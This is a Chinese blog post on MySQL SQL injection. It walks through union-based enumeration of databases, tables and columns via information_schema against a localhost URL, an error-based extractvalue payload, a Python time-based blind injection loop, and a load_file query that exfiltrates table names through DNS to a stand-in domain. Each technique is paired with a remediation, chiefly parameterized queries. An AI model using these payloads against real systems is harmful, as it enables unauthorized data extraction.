---
title: mysql注入
date: 2016-12-01T23:11:44+08:00
draft: false
toc: true
comments: true
aliases:
  - /detail/31
  - /detail/31/
tags:
  - sql
---

## 2016-12 备份

### 0、样例链接

http://127.0.0.1/sql.php?id=1

### 1、步骤

1. 查看是否存在注入点
2. 使用`union`sql关键字来获取数据
3. 通过查询information_schema数据库元数据如存在什么数据库、什么表、什么数据
4. 联合union和select获取数据
5. 若存在sql关键字检测替换可以：selselectect

### 2、查看是否存在注入点

#### （1）添加单引号`'`

http://127.0.0.1/sql.php?id=1' 报错
原理：

```sql
select * from user where id=1'
```

#### （2）添加 `and 1=1` `' and '1'='1`、和 `and 1=2`、 //返回不同页面

* http://127.0.0.1/sql.php?id=1 and 1=1

原理：

```sql
select * from user where id=7 and 1=1;
```

* http://127.0.0.1/sql.php?id=1 and 1=2

原理：

```sql
select * from user where id=7 and 1=2;
```

* http://127.0.0.1/sql.php?username=b' and '1'='1

原理：

```sql
#正常语句
select * from user where username='b';
注入后语句
select * from user where username='b' and '1'='1';
```

#### （3）使用`or 2>1`和`or 1>2`返回不同页面

略

### 3、查看`union`查看`information_schema`数据库

#### （1）union试探

http://127.0.0.1/sql.php?id=7 union select 1, 'a', 1, 1, 1
原理：

```sql
select * from user where id=7 union select 1, 'a', 1, 1, 1;
```

#### （2）查看有几个数据库

http://127.0.0.1/sql.php?id=7 union select 1,SCHEMA_NAME, 1, 1, 1 from  information_schema.SCHEMATA

```sql
select * from user where id=7 union select 1,SCHEMA_NAME, 1, 1, 1 from  information_schema.SCHEMATA;
```

#### （3）查看数据库中有几张表

查看test数据库表信息
http://127.0.0.1/sql.php?id=7 union select 1,TABLE_NAME, 1, 1, 1 from  information_schema.TABLES where TABLE_SCHEMA='test'

原理

```sql
select * from user where id=7 union select 1,TABLE_NAME, 1, 1, 1 from  information_schema.TABLES where TABLE_SCHEMA='test';
返回
+----+----------+------+------+--------+
| id | username | age  | sex  | salary |
+----+----------+------+------+--------+
|  7 | b        |   18 | 3    |   NULL |
|  1 | user     |    1 | 1    |   1.00 |
+----+----------+------+------+--------+
```

#### （4）查看表中的字段

查看test数据库的user表的字段
http://127.0.0.1/sql.php?id=7 union select 1,COLUMN_NAME, 1, 1, 1 from  information_schema.COLUMNS where TABLE_SCHEMA='test' and TABLE_NAME='user'
原理

```sql
select * from user where id=7 union select 1,COLUMN_NAME, 1, 1, 1 from  information_schema.COLUMNS where TABLE_SCHEMA='test' and TABLE_NAME='user';
```

### 4、查看指定表的数据即可

略，类似上

## 研发视角看常见的 SQL 注入手段

### 直接使用用户输入拼接 SQL 语句 直接通过接口返回

后端 需要 用户输入的数据去查询数据库。此时，如果直接通过拼接字符串的方式构造 SQL 语句，则可能被攻击者通过构造 SQL 的方式查询需其他用户或者敏感数据。

具体示例，参见上文。

解决办法

* 用户输入的数据，通过 数据库提供的 预编译 SQL 方式的能力执行 SQL 语句

### 利用 SQL 执行报错信息获取信息

```sql
use test;
select extractvalue(1,concat(0x7e,(select database()),0x7e));
```

执行以上 SQL 语句，将返回一个错误信息： `ERROR 1105 (HY000): XPATH syntax error: '~test~'`

若 SQL 中报错信息后端没有处理，直接返回给前端，可能会泄漏信息，解决办法：

* 用户输入的数据，通过 数据库提供的 预编译 SQL 方式的能力执行 SQL 语句
* 数据库报错信息，不能直接返回给前端

### 盲 SQL 注入

盲 SQL 注入指的是，利用不同的输入，响应的不同，通过暴力枚举的方式，猜测数据。不同的想用指的是

* 是否报错
* 响应时间不一致

#### 举例 OrderBy 字段

MySQL OrderBy 字段不支持预编译。因此，如果 Order By 字段完全使用用户填写的字段构造 SQL 语句，则存在该问题。比如 用户构造 `if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={},sleep(2),0)".format(str(i), str(j))` 可以根据延迟暴力解出当前库的表名

```python
for i in range(1, 50):
    for j in range(32, 127):
        order = "if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={},sleep(2),0)".format(str(i), str(j))
        start = time.now()
        # 执行 sql
        end = time.now()
        if end - start > 2:
            # 当前字符为 j
            break
```

解决办法

* Order By 在后端有固定的枚举值，不允许用户随便填写

#### OAST 技术

MySQL 场景，执行 `load_file` 可以触发一次 DNS 查询，攻击者只要构建一个 DNS 服务器，即可将相关信息传递给攻击者。

例如

```sql
use test;
select load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1), '.a.b.c.com'));
```

这样，`a.b.c.com` 就会收到一个 DNS 查询：`test.a.b.c.com`

解决办法：禁用外网的 DNS 解析

### 解决方案

所有用户输入的参数，都不可信任，必须完全使用参数化查询（预编译 SQL），针对不支持预编译的字段，必须以枚举值的方式或者严格校验的方式传递给数据库执行（比如 order by 字段）
